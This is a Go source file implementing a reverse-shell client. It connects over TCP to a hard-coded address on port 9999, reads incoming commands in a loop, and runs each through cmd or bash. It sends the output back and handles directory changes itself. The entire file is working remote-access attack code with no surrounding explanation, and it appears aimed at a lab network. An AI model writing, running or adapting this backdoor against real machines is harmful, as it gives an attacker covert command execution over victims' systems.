package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func Execute(value string) string {
	name := "windows"

	switch runtime.GOOS {
	case "windows":
		name = "cmd"
		value = "/C" + " " + value
	default:
		name = "/bin/bash"
		value = "-c" + " " + value
	}

	fmt.Println(name, value)

	tmp := strings.Split(value, " ")

	cmd := exec.Command(name, tmp...)
	output, err := cmd.Output()
	if err != nil {
		return err.Error()
	}
	return string(output)
}

func main() {
	const ipAddr = "192.168.29.4" // IP Address of the socket server
	conn, err := net.Dial("tcp", ipAddr+":9999")
	if err != nil {
		panic(err)
	}

	os.Chdir("C:/")

	for {
		buffer := make([]byte, 2048)
		_, err := conn.Read(buffer)
		if err != nil {
			fmt.Println(err)
			break
		}

		command := strings.Trim(string(buffer), "\x00")

		if strings.HasPrefix(command, "cd") {
			tmp := strings.Split(command, " ")
			os.Chdir(tmp[1])
			dir, _ := os.Getwd()
			conn.Write([]byte(dir))
			continue
		}

		output := Execute(command)

		if command == "exit" {
			break
		}

		conn.Write([]byte(output))
	}

	defer conn.Close()
}
